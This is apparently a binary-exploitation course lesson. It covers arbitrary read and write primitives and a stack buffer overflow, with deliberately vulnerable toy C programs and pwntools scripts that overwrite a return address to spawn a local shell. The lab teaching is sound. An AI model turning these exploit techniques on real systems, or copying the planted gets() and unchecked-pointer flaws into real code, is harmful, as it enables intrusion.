With a strong foundation in reverse engineering we are now ready to shift our goal to binary exploitation. Binary exploitation is a broad term, but generally refers to taking advantage of vulnerabilities at the binary level in order to force a system to execute different or arbitrary functionality. This is different from higher-level attacks such as network attacks or application misconfigurations.

We leverage binary vulnerabilities in order to achieve an end goal of _remote code execution_, or RCE. RCE can be anything, but usually _proofs of concept_, POCs, include reading or writing to the filesystem, exfiltrating in-process secrets, or _popping a shell_. Our goal in the upcoming lessons is to pop a shell, which is to force the program to execute `system(/bin/sh)` (or other shell) as the current user. From that shell we can read the `flag` file on the system as proof of our exploit.

The key to binary exploitation is finding and leveraging vulnerabilities. We classify these vulnerabilities according to their capabilities to better understand what we have and what we still need. We will begin our study of exploitation by looking at some common bug classes and then demonstrate our knowledge by throwing our first binary exploit—a stack buffer overflow!

Table of Contents
* [[#Primitives]]
	* [[#Reads (Leaks)]]
	* [[#Writes (Memory Corruption)]]
* [[#Practical Example - Stack Buffer Overflows]]
	* [[#`gets`]]
	* [[#Hijacking Execution]]
* [[#Recitation]]
* [[#Next Steps]]

## Primitives

We will define security vulnerabilities as primitives going forward. A primitive is anything "weird" that we can influence in the system. It can be anything from a controllable stack buffer overflow to flipping a single bit in memory. A primitive in and of itself might not be enough to control the system; exploits of modern systems typically require handfuls of primitives chained together to increase the power and reach of the individual vulnerabilities. In this lesson we introduce two primitive classes which form the basis of binary exploitation: reads and writes.

### Reads (Leaks)

We talked a lot about PIE and ASLR at the beginning of this course because they are fundamental security measures in modern systems. Base offset randomization introduced by these protections means an attacker (us) has no idea where the binary and libraries reside in memory. Depending on our target and our other primitives, a read might not be necessary—but for most modern systems we need to _break_ ASLR and/or PIE to find information in the binary, leverage glibc functions like `system`, etc.

Thus, a read primitive which can leak data—such as the address of a function or location of a global variable—in the virtual memory space can help us identify the base address of a library and other functions in that library, similar to how we practiced in [[0. Operating Systems Refresher & Pwntools]]. 

Reads can be limited or unlimited. We refer to unlimited reads as "arbitrary reads," meaning that we control the address we want to read from. [[arb_read.c |Consider the following example]], which is a toy binary that contains a hidden secret:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

#define BUF_LEN 0x20

int secret_value = 0x13371137;

int main() {
    char buf[BUF_LEN];
    puts("Hi, give me a number!");
    read(0, buf, BUF_LEN);
    printf("%llx\n", **(unsigned long long**)buf);
}
```

The vulnerability here is contrived but illustrates the capabilities of an arbitrary read. The program accepts input from the user, casts that input as an address (`unsigned long long*`), and writes back the value at that address to the user.

There is a huge caveat here: the address _must_ be a valid address in memory and it must be on a readable page. Providing an unmapped or unreadable memory address results in a `SIGSEGV` signal indicating a _segmentation fault_ or _segfault_. Segfaults crash the program, meaning we need to restart our exploit from the beginning.

If we compile this binary with `gcc arb_read.c -o arb_read -no-pie -fno-PIC` we force the compiler to abandon its default PIE compilation setting and end up with a [[arb_read| no-pie binary]]. We can easily fetch the address of the `secret_value` symbol (since this binary is not stripped) using `readelf`:

```console
$ readelf -Ws arb_read | grep secret_value
    25: 0000000000404030     4 OBJECT  GLOBAL DEFAULT   25 secret_value
```

The next step is understanding how to send the address. We see no call to `atoi`, `strtol`, or similar function to convert ASCII numerals to an integer. Consequently we must send raw bytes which will be stored in memory as a little-endian value representing an address. Let's create a simple Python script with `pwntools` to send these bytes. We'll use the `pwntools.ELF` module, as we introduced in [[1. Reverse Engineering Tools]], to fetch the address from `pwntools` instead of hard-coding it. This is extremely useful when we want our scripts to be configurable for different versions of a target that have different offsets.

```python
from pwn import*

binary_name = "arb_read"

e = ELF(binary_name)
p = process(binary_name)
p.send(p64(e.symbols.secret_value))
p.interactive()
```

We use the `p64` utility to encode the integer as `bytes` in little-endian format. _It's important to send all eight bytes, including leading zeros—otherwise we risk relying on bytes already residing in the buffer which may be non-zero_. Keeping the socket open with `p.interactive()` shows the response from the server, which is the hexadecimal representation of `secret_value`!

Read primitives are not always this powerful—in some cases we can only leak a single byte's value or the non-zero bytes trailing a string. We'll get more practice with different types of read primitives in the coming weeks and learn how to leverage them to be more powerful in conjunction with other vulnerabilities! 

### Writes (Memory Corruption)

A quintessential binary exploitation vulnerability class is memory corruption. But simply stating "this program has a memory corruption vulnerability" is not sufficient to understand the power of the bug. Does it uncontrollably change an address to `0x0`, thus causing a null-dereference error? Such would result in a _denial of service_ (DOS) attack, but would not be useful for attaining RCE. Like with reads, we must further classify writes according to their capabilities.

Also like reads, we have the concept of an arbitrary write. This is an extremely powerful primitive, especially in conjunction with an arbitrary read. Such a pair normally results in RCE, no matter how many protections are in place.

Let's take a look at a simple binary that should never result in a winning condition:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

#define BUF_LEN 0x20

int secret_value = 0x13371137;

int main() {
    char buf[BUF_LEN];
    puts("Hi, give me a number!");
    read(0, buf, BUF_LEN);
    int* addr = *(int**)buf;
    puts("Hi, give me another number!");
    read(0, buf, BUF_LEN);
    int val = *(int*)buf;
    *addr = val;
    printf("My secret value is: %x\n", secret_value);
    if (secret_value == 0xdeadbeef) {
        puts("Yes, you win!");
    } else {
        puts("Nope, try the arbitrary write again!");
    }
}
```

We see above that the `secret_value` is initialized to `0x13371337` and never overwritten. The only access is to print its value before a comparison which does not modify its value.

> We actually need the `printf("My secret value is: %x\n", secret_value);` memory access otherwise the program will _never_ win. `gcc` runs optimizations to check for dead code. If `secret_value` is never accessed, it sees no need for the `if` statement and eliminates that branch, causing a failure in every case!

The beginning of this program is similar to the arbitrary read, and again we need to compile with `gcc arb_read.c -o arb_read -no-pie -fno-PIC` to ensure that we know where `secret_value` is in memory. In this case we're given extra functionality, which is writing a value of our choice to the memory address we specify. Again, we must send the values in binary bytes because there is no conversion between ASCII numerals and decimal values. Let's write another simple Python script with `pwntools` to leverage the vulnerability.

```python
from pwn import*

binary_name = "arb_write"

e = ELF(binary_name)
p = process(binary_name)
p.send(p64(e.symbols.secret_value))
p.recvuntil(b"another number!")
p.send(p32(0xdeadbeef))
p.interactive()
```

> This program has back-to-back reads which expect separate values. Running two `p.send()` commands in sequence will likely result _all values sent being read in the first call_. For that reason we must make sure to sync with the binary by waiting for the second prompt before sending it.

Running the program shows that `secret_value`'s value was modified, and we passed the condition!

Like reads, writes can be bounded and unbounded. It's not uncommon to see primitives such as single null byte overflow (due to bad string length calculation when null-terminating a string) that are turned into full RCE. In the next section we will get experience with one of the quintessential memory corruption vulnerabilities: a stack buffer overflow.

## Practical Example - Stack Buffer Overflows

Stack buffer overflows were thrust into the spotlight in the mid-nineties when Aleph One published their [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) Phrack article. The stack buffer overflow was so pervasive and powerful that the stack canary mitigation was introduced and adopted as a baseline standard in modern compilers. Furthermore, the `gets` function, called out specifically by Aleph One, is now flagged in its own `man` page and by `gcc` as vulnerable.

```
gets(3)                                                                                Library Functions Manual                                                                                gets(3)

NAME
       gets - get a string from standard input (DEPRECATED)

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include <stdio.h>

       [[deprecated]] char *gets(char *s);

DESCRIPTION
       Never use this function.
```

```console
$ gcc stack.c -o stack -no-pie -fno-stack-protector -fno-pic
/usr/bin/ld: /tmp/ccMZqxy2.o: in function `greet':
stack.c:(.text+0x44): warning: the `gets' function is dangerous and should not be used.
```

Clang (LLVM) takes it a step further and compiles a warning _into the program_ so that you cannot simply ignore it at compile time.

```console
$ clang stack.c -o stack 
stack.c:12:5: warning: 'gets' is deprecated: This function is provided for compatibility reasons only.  Due to security concerns inherent in the design of gets(3), it is highly recommended that you use fgets(3) instead. [-Wdeprecated-declarations]
$ ./stack
Hi, what's your name??
warning: this program uses gets(), which is unsafe.
```

We're familiar with the stack from our reverse engineering efforts, but let's look at it specifically in the context of a stack buffer overflow.

### `gets`

`gets` is bad and should never be used in production. That said, it's a great place to start as we build our exploitation skills. `gets`, as its name implies, gets user input from `stdin` into a buffer. _There are no length checks, so the user can theoretically write more data into the buffer than it can hold_. The following [[stack.c]] example uses a stack buffer for the argument to `gets`, resulting in a potential stack buffer overflow.

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

void win() {
	printf("If you make it here, you win!");
	system("/bin/sh");
	exit(0);
}

void greet() {
	char buf[0x20];
    puts("Hi, what's your name??");
    gets(buf);
    printf("Hello, %s\n", buf);
}

int main() {
	greet();
	return 0;
}
```

We need to compile with specific flags to allow a stack buffer overflow, specifically `-fno-stack-protector`. We add `-w` to ignore the `gets` warnings from the compiler.

```bash
gcc stack.c -o stack -fno-stack-protector -no-pie -fno-pic -w
```

If we send `0x20` or fewer bytes (taking into account the `\n` character when we press `<enter>` in a terminal) we should expect normal behavior. Sending more than `0x20` bytes is when behavior is undefined. To understand specifically how to control this undefined behavior we need to look at the stack in more detail. Let's open the binary in Binja and use its stack view icon on the righthand toolbar to visualize the `greet` function. 

![[stack_binja.png]]

Functions like `fgets` have a length field, which we've used in prior lessons, to define the length of a buffer. Unfortunately `gets` does not control the read (buffer) length, thus leading to the vulnerability. But this view still gives us an idea of where our input is stored on the stack relative to other data.

So, we can theoretically overflow this stack buffer, but what do we do with it? Remember our [[2. Reverse Engineering Basics#Prologue and Epilogue|prologue]]? We see the pushed return instruction pointer labeled as `__return_addr` and pushed stack base pointer labeled as `__saved_rbp`. In this case the return instruction pointer points to the instruction immediately following `call greet` in `main`. 

We have a fun `win` function which is never called nor referenced elsewhere, yet we want to execute that code to win. Stack buffer overflows in `x86_64` are powerful because they allow us to overwrite the pushed values on the stack, _specifically the pushed instruction pointer_. Remember that the `ret` instruction pops that pushed address into `rip` at a function's epilogue to continue execution in the calling function. What happens if we change that value to something different? Say we just try to clobber it with `0x4141414141414141` (a bunch of `A`s) first, to confirm we can reach and control it.

We need to clobber up to the point of the return address, and for this example we can use any input bytes we want (though this may not be the case in future examples or exercises). The screenshot from Binja shows that the buffer is `0x28` bytes below the return instruction pointer, so let's fill that space with `B`s (`0x42`). Since we're just sending ASCII data for this test we can run the binary locally and send `0x28` `B`s followed by eight `A`s:

```console
$ ./stack 
Hi, what's your name??
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAA
Hello, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAA
Segmentation fault (core dumped)
```

We see a segmentation fault and core dump! So we definitely triggered some nefarious behavior, but did we control the address we expected? In a situation like this we can quickly use `gdb` to examine the core dump in `/var/lib/systemd/coredump`. In this case we're specifically interested in whether or not we caused a crash because we controlled `rip` at the return from `greet`.

```shell
unzstd /var/lib/systemd/coredump/<coredump file>
gdb stack /var/lib/systemd/coredump/<coredump file>
```

> Core dumps are not automatically generated with modern (`systemd`) Linux systems. Run `apt install systemd-coredump` and then crash the binary again. The associated core dump file will now be present in `/var/lib/systemd/coredump/`.

```gdb
Core was generated by `./stack'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0000000000401220 in greet ()
gef➤  context

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x38              
$rbx   : 0x7ffde48da8a8    
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x7ffde48da788    
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0xcc72a0          
$rdi   : 0x7ffde48da580    
$rip   : 0x0000000000401220  →  0x894855fa1e0ff3c3
$r8    : 0x73              
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x7ffde48da8b8    
$r14   : 0x0000000000403e00  →  0x0000000000401180  →  0x2ead3d80fa1e0ff3
$r15   : 0x00007ff4c5f6e000  →  0x00007ff4c5f6f2d0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────── stack ────
[!] Unmapped address: '0x7ffde48da788'
──────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401219 <greet+0038>     call   0x4010a0 <printf@plt>
     0x40121e <greet+003d>     nop    
     0x40121f <greet+003e>     leave  
 →   0x401220 <greet+003f>     ret    
[!] Cannot disassemble from $PC
```

We see there is an unmapped address at `0x7ffde48da788`, which is the value of `rsp`. Let's see what's stored at that address by dumping some bytes at `rsp` and some instructions at the crashing `pc`:

```gdb
gef➤  x/10xg 0x7ffde48da788
0x7ffde48da788:	0x4141414141414141	0x0000000000000000
0x7ffde48da798:	0x00007ff4c5c28150	0x0000000000000000
0x7ffde48da7a8:	0x0000000000401221	0x0000000100000000
0x7ffde48da7b8:	0x00007ffde48da8a8	0x00007ffde48da8a8
0x7ffde48da7c8:	0xa15b331af74ae2dd	0x0000000000000000
gef➤  x/4i 0x0000000000401220
=> 0x401220 <greet+63>:	ret
   0x401221 <main>:	endbr64
   0x401225 <main+4>:	push   rbp
   0x401226 <main+5>:	mov    rbp,rsp
```

Ah-ha! The program fails on the `ret` instruction as it tries to pop `0x4141414141414141` into `rip` because that address is not in memory. This means we have full control over `rip` as we leave `greet`!

> If we did not see `A`s in this location then we could adjust our padding (the `B`s) accordingly to make sure that our offset is correct and we fully control the value popped into `rip` by `ret`.

### Hijacking Execution

Now, what do we want to do with this power? Our end goal may vary based on our target and situation, but for the sake of this program we have a `win` function which spawns a shell. Let's change our `A`s to instead be a little-endian byte value of `win`'s address. Because this binary is no-PIE we know the address of `win`—if PIE is turned on then we must use a leak to find an address in the binary to break PIE.

> It's important to understand that we hijack execution with the _existing program state_. We control `rip` but currently do not control the value of other registers—aside from the popped RBP value we corrupt prior to the pushed RIP—or memory other than the stack buffer values we input. Because `win` takes no arguments we do not need to control any other registers (we will learn how to do this when we cover return oriented programming, a.k.a. ROP, and shellcoding) and thus can jump to the entry of the function without worrying about `rdi`, `rsi`, etc. being set to specific values. 

Because we need to send raw bytes (an address) which is not represented in ASCII, let's draft a Python script leveraging `pwntools`'s `ELF` utility to look up the function address:

```python
from pwn import *

e = ELF("./stack")
p = process("./stack")
p.recvuntil(b"??\n")
# need to send a newline for gets
p.sendline(b'B' * 0x28 + p64(e.symbols.win))
# drop into interactive shell to use shell we popped!
p.interactive()
```

Let's throw this exploit and see what happens!

```
[+] Starting local process './stack': pid 2420133
[*] Switching to interactive mode
Hello, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\xb6\x11@
[*] Got EOF while reading in interactive
$ ls
[*] Process './stack' stopped with exit code -11 (SIGSEGV) (pid 2420133)
```

We get a segmentation fault. Why does this happen? In a situation like this—when we think things should be working but they are not—we must debug. Let's switch to `gdb.debug` to throw our exploit with `pwntools` and debug the crash. What we see is that there is a crash on an `xmm` register in glibc's `do_system` call:

```gdb
Program received signal SIGSEGV, Segmentation fault.
0x00007fb0c3654f9b in do_system (line=0x402022 "/bin/sh") at ../sysdeps/posix/system.c:148

# ... snip ...

──────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7fb0c3654f88 <do_system+0158> lea    rsi, [rip+0x16b48c]        # 0x7fb0c37c041b
   0x7fb0c3654f8f <do_system+015f> mov    QWORD PTR [rsp+0x70], 0x0
   0x7fb0c3654f98 <do_system+0168> mov    r9, QWORD PTR [rax]
 → 0x7fb0c3654f9b <do_system+016b> movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7fb0c3654fa0 <do_system+0170> call   0x7fb0c370e360 <__GI___posix_spawn>
   0x7fb0c3654fa5 <do_system+0175> mov    rdi, rbx
   0x7fb0c3654fa8 <do_system+0178> mov    r12d, eax
   0x7fb0c3654fab <do_system+017b> call   0x7fb0c370e800 <__posix_spawnattr_destroy>
   0x7fb0c3654fb0 <do_system+0180> test   r12d, r12d
```

This hearkens back to our discussion of `x86_64` calling conventions. One of the calling convention specifications we did not cover is that `sp` must be 16-byte aligned (must end in a `0`, not an `8`) at the point of a `call` instruction and after the prologue of a function. 

From the [Microsoft documentation](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170):

> The stack pointer must remain 16-byte aligned in any region of code that isn't part of an epilog or prolog, except within leaf functions.

During normal operation, the `call` instruction pushes the return instruction pointer and the prologue pushes the return base pointer, which results in the stack remaining 16-byte aligned. However, when we corrupt `rip` to perform a "call," it actually acts like a jump—there is no `call` instruction used, we simply jump execution to the start of a new function. This does not push the return instruction pointer, but the prologue after the jump still pushes the return base pointer. The result is a `sp` that is eight-byte aligned which violates the calling convention requirement. This yields an error when using an `xmm` instruction—albeit much later in glibc—which expects the stack to be 16-byte aligned. This [Stack Overflow Post](https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul) (very apropos, given our lesson on stack overflows!) explains more.

There is an easy option to circumvent this error. We cannot push the return instruction pointer but we can simply skip over the `endbr64; push rbp` instructions in the prologue by jumping a few instructions after the function's entry. We don't care about returning from the function in this example, so maintaining a "valid" stack is not important to our goal. Our modified script is below, using `pwntools`'s `asm` functionality to calculate the exact length of those instructions to add to the function's entry address:

```python
from pwn import *

context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"

e = ELF("./stack")
p = gdb.debug("./stack", '''
    continue
''')
p.recvuntil(b"??\n")
# calculate length of `push rbp` instruction:
a = asm("endbr64 ; push rbp")
# need to send a newline for gets
p.sendline(b'B' * 0x28 + p64(e.symbols.win + len(a)))
# drop into interactive shell to use shell we popped!
p.interactive()
```

When we try again, we get our intended result and have successfully performed our first binary exploitation attack!

```
[+] Starting local process '/usr/bin/gdbserver': pid 2420375
[*] running in new terminal: ['/usr/bin/gdb', '-q', './stack', '-x', '/tmp/pwntzm8nzse.gdb']
5
[*] Switching to interactive mode
Hello, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\xbb\x11@
Detaching from process 2420395
$ whoami
root
```

## Recitation

#### Recitation 5.0

Write a script to leak each byte of `secret_key` from [[recitation5.0]], the compiled version of the following source code:

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

#define BUF_LEN 0x20

// gcc recitation5.0.c -o recitation5.0 -no-pie -fno-PIC

long secret_key = 0x6d79736563726574;

int main() {
    char buf[BUF_LEN];
    while (1) {
        puts("Hi, give me a number!");
        read(0, buf, BUF_LEN);
        write(1, *(void**)buf, 1);
    }
}
```

#### Recitation 5.1

Figure out how to leak an address to break ASLR and find the base address of the compiled [[recitation5.1]] with the following source code. _Hint: disassemble the `main` function to find useful stack values to leak._

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

#define BUF_LEN 0x20

long my_global = 0x4141414142424242;

// gcc recitation5.1.c -o recitation5.1

int main() {
    char buf[BUF_LEN];
    long* global_ptr = &my_global;
    long arr[4] = { 0xdeadbeefdeadbeef, 0x1337c0de1337c0de, 0xdaddb0dddaddb0dd,
                    0xc01d3315c01d3315 };
    puts("Hi, what index do you want?");
    read(0, buf, BUF_LEN);
    long idx = strtol(buf, NULL, 10);
    printf("Your value is: %lx!\n", arr[idx]);
    return 0;
}
```

#### Recitation 5.2

Similar to [[#Recitation 5.0]], leverage the loop and the one-byte arbitrary write vulnerability in [[recitation5.2]]. Corrupt the secret key and break out of the infinite loop.

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

#define BUF_LEN 0x20

// gcc recitation5.2.c -o recitation5.2 -no-pie -fno-PIC

long secret_key = 0x6d79736563726574;

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    char buf[BUF_LEN];
    char buf2[BUF_LEN];
    printf("My secret key is set to %lx\n", secret_key);
    while (1) {
        if (secret_key == 0xdeadbeef1337c0d3) {
            break;
        }
        printf("Hi, give me two numbers!\n> ");
        read(0, buf, BUF_LEN);
        printf("> ");
        read(0, buf2, BUF_LEN);
        **(char**)buf = *(char*)buf2;
    }
    puts("You win!");
}
```

#### Recitation 5.3

Combine your experience in [[#Recitation 5.1]] and [[#Recitation 5.2]] to leak the binary's base address and then corrupt the secret key in [[recitation5.3]] to the desired value:

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

#define BUF_LEN 0x20

// gcc recitation5.3.c -o recitation5.3

long secret_key = 0x6d79736563726574;

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    long* secret_key_ptr = &secret_key;
    long arr[4] = { 0xdeadbeefdeadbeef, 0x1337c0de1337c0de, 0xdaddb0dddaddb0dd,
                    0xc01d3315c01d3315 };
    char buf[BUF_LEN];
    char buf2[BUF_LEN];
    printf("My secret key is set to %lx\n", *secret_key_ptr);

    puts("What number is your favorite from this array?");
    read(0, buf, BUF_LEN);
    long idx = strtol(buf, NULL, 10);
    printf("Yeah, I like %lx too!\n", arr[idx]);

    while (1) {
        if (secret_key == 0xdeadbeef1337c0d3) {
            break;
        }
        printf("Hi, give me two numbers!\n> ");
        read(0, buf, BUF_LEN);
        printf("> ");
        read(0, buf2, BUF_LEN);
        **(char**)buf = *(char*)buf2;
    }
    puts("You win!");
}
```

## Next Steps

We have just scratched the surface of binary exploitation in this module. In the upcoming lessons we will gain familiarity with different primitives, leveraging leaks in conjunction with corruption to bypass common defensive mitigations!